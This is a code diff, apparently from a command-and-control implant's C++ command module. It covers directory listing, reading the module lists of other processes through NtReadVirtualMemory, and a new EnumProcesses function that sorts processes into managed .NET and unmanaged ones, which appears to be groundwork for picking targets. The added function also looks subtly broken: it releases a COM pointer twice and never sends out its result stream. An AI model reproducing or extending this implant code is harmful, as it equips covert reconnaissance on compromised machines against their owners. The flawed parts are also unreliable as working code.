@@ -1,4 +1,6 @@
 #include <core/corelib.hpp>
+#include <core/dotnet.hpp>
+
 namespace Commands {
 
     VOID DirectoryList (PPARSER Parser) {
@@ -17,21 +19,19 @@ namespace Commands {
 
         Stream::PackDword(Outbound, CommandDir);
 
-        Path    = R_CAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH));
         Target  = Parser::UnpackString(Parser, nullptr);
+        Path    = R_CAST(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH));
 
         if (Target[0] == PERIOD) {
             if (!(PathSize = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, Path))) {
                 return_defer(ERROR_DIRECTORY);
             }
-
             if (Path[PathSize - 1] != BSLASH) {
                 Path[PathSize++] = BSLASH;
             }
 
             Path[PathSize++]  = ASTER;
             Path[PathSize]    = NULTERM;
-
         } else {
             x_memcpy(Path, Target, MAX_PATH);
         }
@@ -69,8 +69,8 @@ namespace Commands {
         } while (Ctx->win32.FindNextFileA(File, &Next) != 0);
 
         Message::OutboundQueue(Outbound);
-        defer:
 
+        defer:
         if (File) {
             Ctx->win32.FindClose(File);
         }
@@ -116,7 +116,6 @@ namespace Commands {
 
             Head = &LdrData->InMemoryOrderModuleList;
             while (Entry != Head) {
-
                 if (
                     !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, CONTAINING_RECORD(Entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &cMod, sizeof(LDR_DATA_TABLE_ENTRY), nullptr)) ||
                     !NT_SUCCESS(Ctx->Nt.NtReadVirtualMemory(Process, cMod.FullDllName.Buffer, &ModNameW, cMod.FullDllName.Length, &size)) ||
@@ -141,6 +140,70 @@ namespace Commands {
 
         Message::OutboundQueue(Outbound);
         defer:
+    }
+
+    VOID EnumProcesses(PPARSER Parser) {
+
+        PSTREAM Stream          = Stream::CreateStreamWithHeaders(TypeResponse);
+        PROCESSENTRY32 Entries  = { };
+        HANDLE Snapshot         = { };
+        HANDLE hProcess         = { };
+
+        IEnumUnknown *pEnum         = { };
+        ICLRMetaHost *pMetaHost     = { };
+        ICLRRuntimeInfo *pRuntime   = { };
+
+        DWORD Type  = Parser::UnpackDword(Parser);
+        DWORD Size  = 0;
+        WCHAR Buffer[1024];
+        BOOL Loaded = FALSE;
+
+        Entries.dwSize = sizeof(PROCESSENTRY32);
+        Size = ARRAY_LEN(Buffer);
+
+        if (
+            (Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE ||
+            !Process32First(Snapshot, &Entries)) {
+            return;
+        }
+        do {
+            if (!(hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Entries.th32ProcessID))) {
+                continue;
+            }
+
+            BOOL isManagedProcess = FALSE;
+
+            if (SUCCEEDED(CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost)))) {
+                if (SUCCEEDED(pMetaHost->EnumerateInstalledRuntimes(&pEnum))) {
+                    while (S_OK == pEnum->Next(1, (IUnknown **) &pRuntime, nullptr)) {
+
+                        if (pRuntime->IsLoaded(hProcess, &Loaded) == S_OK && Loaded == TRUE) {
+                            isManagedProcess = TRUE;
+
+                            if (Type == MANAGED_PROCESS && SUCCEEDED(pRuntime->GetVersionString(Buffer, &Size))) {
+                                Stream::PackDword(Stream, Entries.th32ProcessID);
+                                Stream::PackString(Stream, Entries.szExeFile);
+                                Stream::PackWString(Stream, Buffer);
+                            }
+                        }
+                        pRuntime->Release();
+                    }
+                }
+            }
+
+            if (!isManagedProcess && Type == UNMANAGED_PROCESS) {
+                Stream::PackDword(Stream, Entries.th32ProcessID);
+                Stream::PackString(Stream, Entries.szExeFile);
+            }
+
+            if (pMetaHost) { pMetaHost->Release(); }
+            if (pRuntime) { pRuntime->Release(); }
+            if (pEnum) { pEnum->Release(); }
+
+            CloseHandle(hProcess);
+        } while (Process32Next(Snapshot, &Entries));
+
+        CloseHandle(Snapshot);
     }
 
     VOID Shutdown (PPARSER Parser) {
